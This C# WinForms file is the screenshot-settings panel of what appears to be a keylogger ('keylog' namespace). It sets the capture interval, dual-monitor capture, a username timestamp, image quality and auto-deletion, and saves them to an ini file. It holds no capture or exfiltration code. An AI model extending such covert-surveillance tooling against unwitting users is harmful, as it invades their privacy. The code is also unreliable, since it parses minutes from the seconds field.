using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using tt;

namespace keylog
{
    public partial class Screenshot : UserControl
    {
        public Screenshot()
        {
            InitializeComponent();
        }
        private Dictionary<string, string> d = new Dictionary<string, string>();
        private void btn_OK_Click(object sender, EventArgs e)
        {
            //clear dictionary
            d.Clear();

            if (!ckb_Enable.Checked)
            {
                d.Add("Enable", "false");
            }
            else
            {
                if (tb_min.Text.Trim() == "" || tb_min.Text.All(char.IsDigit)== false)
                    tb_min.Text = "15";

                if (tb_sec.Text.Trim() == "" || tb_sec.Text.All(char.IsDigit) == false)
                    tb_sec.Text = "30";

                int iMinutes = 0;
                Int32.TryParse(tb_sec.Text, out iMinutes);
                int iSecond = 0;
                Int32.TryParse(tb_sec.Text, out iSecond);

                if (iMinutes > 3601 || iSecond > 3601 || iMinutes < 0 || iSecond <= 0)
                {
                    MessageBox.Show("Value minutes from 0 to 3600 \r\n Value seconds from 1 to 3600", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                int iDelete;
                if (ckb_DelAfter.Checked)
                {
                    Int32.TryParse(tb_days.Text, out iDelete);
                    if (iDelete > 0 && tb_days.Text.All(char.IsDigit) && tb_days.Text.Trim() != "" && iDelete <= 365)
                    {

                    }
                    else
                    {
                        MessageBox.Show("Value from 1 to 365", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                }


                d.Add("Enable", "true");
                d.Add("Minutes", tb_min.Text.ToString());
                d.Add("Seconds", tb_sec.Text.ToString());

                if (ckb_TimeStampUser.Checked)
                    d.Add("Timestamp_Username", "true");
                else
                    d.Add("Timestamp_Username", "false");

                if (ckb_Enable2Screen.Checked)
                    d.Add("Double_Monitor", "true");
                else
                    d.Add("Double_Monitor", "false");

                d.Add("Quality", trB_quality.Value.ToString());

                if (ckb_DelAfter.Checked)
                    d.Add("Delete", "true");
                else
                    d.Add("Delete", "false");

                d.Add("Days", tb_days.Text.ToString());
                //d.Add("Type", mcmbQuality_Screenshot.SelectedIndex.ToString());

            }
            if (File.Exists("Screenshot_conf.ini"))
                File.Delete("Screenshot_conf.ini");
            using (StreamWriter file = new StreamWriter("Screenshot_conf.ini"))
                foreach (var entry in d)
                    file.WriteLine("{0},{1}", entry.Key, entry.Value);

            //Application.Restart();
            //this.SendToBack();

        }

        private void Screenshot_Load(object sender, EventArgs e)
        {
            if (File.Exists("Screenshot_conf.ini"))
            {
                Functions.Load_File("Screenshot_conf.ini", d);

                if (Boolean.Parse(d["Enable"].ToString()) == true)
                {
                    ckb_Enable.Checked = Boolean.Parse(d["Enable"].ToString());
                    tb_min.Text = d["Minutes"].ToString();
                    tb_sec.Text = d["Seconds"].ToString();
                    ckb_TimeStampUser.Checked = Boolean.Parse(d["Timestamp_Username"]);
                    ckb_Enable2Screen.Checked = Boolean.Parse(d["Double_Monitor"]);
                    trB_quality.Value = Int32.Parse(d["Quality"]);
                    //mcmbQuality_Screenshot.SelectedIndex = Int32.Parse(d["Type"]);
                    tb_days.Text = d["Days"].ToString();
                    ckb_DelAfter.Checked = Boolean.Parse(d["Delete"]);
                }
                else
                    ckb_Enable.Checked = false;

                if (!ckb_Enable.Checked)
                {
                    ckb_DelAfter.Enabled = false;
                    ckb_TimeStampUser.Enabled = false;
                    //mchkWindows_Sreenshot.Enabled = false;
                    //mcmbQuality_Screenshot.Enabled = false;
                    ckb_Enable2Screen.Enabled = false;
                    tb_days.Enabled = false;
                    tb_min.Enabled = false;
                    tb_sec.Enabled = false;
                    trB_quality.Enabled = false;
                }
                else
                {
                    ckb_DelAfter.Enabled = true;
                    ckb_TimeStampUser.Enabled = true;
                    //mchkWindows_Sreenshot.Enabled = true;
                    //mcmbQuality_Screenshot.Enabled = true;
                    ckb_Enable2Screen.Enabled = true;
                    tb_days.Enabled = true;
                    tb_min.Enabled = true;
                    tb_sec.Enabled = true;
                    trB_quality.Enabled = true;

                }
            }
        }
        private void ckb_Enable_OnChange(object sender, EventArgs e)
        {
            if (!ckb_Enable.Checked)
            {
                ckb_DelAfter.Enabled = false;
                ckb_TimeStampUser.Enabled = false;
                ckb_Enable2Screen.Enabled = false;
                tb_days.Enabled = false;
                tb_min.Enabled = false;
                tb_sec.Enabled = false;
                trB_quality.Enabled = false;
            }
            else
            {
                ckb_Enable.Enabled = true;
                ckb_TimeStampUser.Enabled = true;
                ckb_TimeStampUser.Checked = true;

                ckb_Enable2Screen.Enabled = true;
                ckb_Enable2Screen.Checked = true;

                ckb_DelAfter.Enabled = true;
                ckb_DelAfter.Checked = true;
                // set default values on delete log and time to send log
                tb_days.Enabled = true;
                tb_days.Text = "3";
                tb_min.Enabled = true;
                tb_min.Text = "10";
                tb_sec.Enabled = true;
                tb_sec.Text = "0";

                trB_quality.Enabled = true;
            }

        }
    }


}
